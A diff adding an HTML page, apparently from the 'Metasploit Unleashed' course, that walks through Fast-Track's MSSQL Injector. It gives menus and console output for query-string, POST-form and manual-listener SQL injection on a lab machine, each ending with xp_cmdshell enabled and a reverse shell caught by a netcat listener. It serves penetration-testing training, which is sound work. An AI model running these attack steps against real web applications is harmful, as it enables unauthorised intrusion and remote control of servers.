@@ -1,0 +1,104 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>MSSQL Injector</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">MSSQL
+Injector</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">The MSSQL Injector utilizes some
+advanced techniques in order to
+ultimately gain full unrestricted access to the underlying system. This
+section requires someone to already know where SQL Injection is on a
+given site. Once this is specified, Fast-Track can do the work for you
+and exploit the system. Note that this will only work on Microsoft SQL
+back-end to a web application.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Fast-Track Main Menu:<br><br>        1.  Fast-Track Updates<br>        2.  Autopwn Automation<br>        3.  Nmap Scripting Engine<br>        4.  Microsoft SQL Tools<br>        5.  Mass Client-Side Attack<br>        6.  Exploits<br>        7.  Binary to Hex Payload Converter<br>        8.  Payload Generator<br>        9.  Fast-Track Tutorials<br>        10. Fast-Track Changelog<br>        11. Fast-Track Credits<br>        12. Exit Fast-Track<br><br>        Enter the number: 4<br><br><br>    Microsoft SQL Attack Tools<br><br>        1. MSSQL Injector<br>        2. MSSQL Bruter<br>        3. SQLPwnage<br><br>        (q)uit<br><br>        Enter your choice : 1<br><br><br>    Enter which SQL Injector you want to use:<br><br>        1. SQL Injector - Query String Parameter Attack<br>        2. SQL Injector - POST Parameter Attack<br>        3. SQL Injector - GET FTP Payload Attack<br>        4. SQL Injector - GET Manual Setup Binary Payload Attack<br><br>        (q)uit<br><br>        Enter your choice:</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Notice the different sub-menus that
+are available. We'll walk
+through each one and explain its purpose. The 'SQL Injector - Query
+String Parameter Attack' specifically targets vulnerable
+query string parameters within a website. Query strings are represented
+as follows:&nbsp;?querystring1=value1&amp;querystring2=value2 and
+injection
+often occurs where value1 and value2 are located. Let's browse to a
+vulnerable site:
+</span>
+<p style="color: rgb(0, 0, 0);">Note the query string parameters on
+top: logon and password. Let's throw a single quote in the
+'login' query string parameter.
+<br>
+<br>
+</p>
+<div style="color: rgb(0, 0, 0);" class="center">
+<div class="floatnone"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/File:Inect_here.jpg"
+ class="image"><img alt="Inect here.jpg"
+ src="http://www.offensive-security.com/w/images/a/ab/Inect_here.jpg"
+ width="848" height="36"></a></div>
+</div>
+<p style="color: rgb(0, 0, 0);"><br>
+<br>
+Now that we know that the login field is susceptible to SQL
+Injection, we need to tell Fast-Track where to actually go to launch
+the attack. We do this by specifying 'INJECTHERE in place of the
+injectable parameter in the query string. This will let Fast-Track know
+what we want to attack. Look at the below output and the ultimate
+result.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Enter which SQL Injector you want to use<br><br>1. SQL Injector - Query String Parameter Attack<br>2. SQL Injector - POST Parameter Attack<br>3. SQL Injector - GET FTP Payload Attack<br>4. SQL Injector - GET Manual Setup Binary Payload Attack<br><br>Enter your choice: 1<br><br><br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>Requirements: PExpect<br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><br>This module uses a reverse shell by using the binary2hex method for uploading.<br>It does not require FTP or any other service, instead we are using the debug<br>function in Windows to generate the executable.<br><br>You will need to designate where in the URL the SQL Injection is by using 'INJECTHERE<br><br>So for example, when the tool asks you for the SQL Injectable URL, type:<br><br>http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah<br><br><br><br>Enter the URL of the susceptible site, remember to put 'INJECTHERE for the injectible parameter<br><br>Example:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah<br><br>Enter here: http://10.211.55.128/Default.aspx?login='INJECTHERE&amp;password=blah<br>Sending initial request to enable xp_cmdshell if disabled....<br>Sending first portion of payload (1/4)....<br>Sending second portion of payload (2/4)....<br>Sending third portion of payload (3/4)...<br>Sending the last portion of the payload (4/4)...<br>Running cleanup before executing the payload...<br>Running the payload on the server...Sending initial request to enable xp_cmdshell if disabled....<br>Sending first portion of payload (1/4)....<br>Sending second portion of payload (2/4)....<br>Sending third portion of payload (3/4)...<br>Sending the last portion of the payload (4/4)...<br>Running cleanup before executing the payload...<br>Running the payload on the server...<br>listening on [any] 4444 ...<br>connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041<br>Microsoft Windows [Version 5.2.3790]<br>(C) Copyright 1985-2003 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Fast-Track automatically re-enables
+the 'xp_cmdshell' stored
+procedure if it is disabled and delivers a reverse payload to the
+system, ultimately giving us full access all through SQL Injection!
+</span>
+<p style="color: rgb(0, 0, 0);">This was a great example of how to
+attack query string parameters,
+but what about forms? Post parameters can also be handled through
+Fast-Track and very easily at that. In the Fast-Track 'MSSQL Injector'
+menu, select 'SQL Injector - POST Parameter Attack'.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Enter which SQL Injector you want to use<br><br>1. SQL Injector - Query String Parameter Attack<br>2. SQL Injector - POST Parameter Attack<br>3. SQL Injector - GET FTP Payload Attack<br>4. SQL Injector - GET Manual Setup Binary Payload Attack<br><br>Enter your choice: 2<br><br>This portion allows you to attack all forms on a specific website without having to specify<br>each parameter. Just type the URL in, and Fast-Track will auto SQL inject to each parameter<br>looking for both error based injection as well as blind based SQL injection. Simply type<br>the website you want to attack, and let it roll.<br><br>Example: http://www.sqlinjectablesite.com/index.aspx<br><br>Enter the URL to attack: http://10.211.55.128/Default.aspx<br><br>Forms detected...attacking the parameters in hopes of exploiting SQL Injection..<br><br>Sending payload to parameter: txtLogin<br><br>Sending payload to parameter: txtPassword<br><br>[-] The PAYLOAD is being delivered. This can take up to two minutes. [-]<br><br>listening on [any] 4444 ...<br>connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041<br>Microsoft Windows [Version 5.2.3790]<br>(C) Copyright 1985-2003 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Not to quote Office Max, but that
+was easy! Fast-Track
+automatically detects the forms and attacks the system for SQL
+Injection, ultimately giving you access to the box.
+</span>
+<p style="color: rgb(0, 0, 0);">If for some reason the query string
+parameter attack was
+unsuccessful, you can use the 'SQL Injector - GET FTP Payload Attack'.
+This requires that you install ProFTPD, and is rarely used. This module
+will setup a payload through FTP echo files and ultimately deliver the
+payload through FTP and SQL Injection.
+</p>
+<p style="color: rgb(0, 0, 0);">The 'SQL Injector - GET Manual Setup
+Binary Payload Attack' can
+be used if you're attacking from one machine but have a listener on
+another machine. This is often used if you're NATed and you have a
+listener box set up on the internet and not on the system you're
+attacking from.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Enter which SQL Injector you want to use<br><br>1. SQL Injector - Query String Parameter Attack<br>2. SQL Injector - POST Parameter Attack<br>3. SQL Injector - GET FTP Payload Attack<br>4. SQL Injector - GET Manual Setup Binary Payload Attack<br><br>Enter your choice: 4<br><br>The manual portion allows you to customize your attack for whatever reason.<br><br>You will need to designate where in the URL the SQL Injection is by using 'INJECTHERE<br><br>So for example, when the tool asks you for the SQL Injectable URL, type:<br><br>http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah<br><br><br><br>Enter the URL of the susceptible site, remember to put 'INJECTHERE for the injectible parameter<br><br>Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah<br><br>Enter here: http://10.211.55.128/Default.aspx?login='INJECTHERE&amp;password=blah<br>Enter the IP Address of server with NetCat Listening: 10.211.55.130<br>Enter Port number with NetCat listening: 9090<br><br><br>Sending initial request to enable xp_cmdshell if disabled....<br>Sending first portion of payload....<br>Sending second portion of payload....<br>Sending next portion of payload...<br>Sending the last portion of the payload...<br>Running cleanup...<br>Running the payload on the server...<br>listening on [any] 9090 ...<br>10.211.55.128: inverse host lookup failed: Unknown server error : Connection timed out<br>connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045<br>Microsoft Windows [Version 5.2.3790]<br>(C) Copyright 1985-2003 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Fast-Track"
+ title="Fast-Track">Fast-Track</a></div>
+</body>
+</html>
